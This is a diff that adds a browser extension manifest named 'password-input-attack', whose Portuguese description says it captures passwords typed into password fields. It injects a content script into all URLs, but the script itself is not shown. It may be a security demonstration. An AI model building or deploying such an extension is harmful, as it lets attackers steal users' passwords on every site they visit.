@@ -1,0 +1,16 @@
+{
+  "manifest_version": 3,
+  "name": "password-input-attack",
+  "version": "1.0",
+  "description": "Captura a senha digitada em um input type password",
+  "permissions": ["scripting", "activeTab"],
+  "action": {
+    "default_popup": "popup.html"
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"]
+    }
+  ]
+}
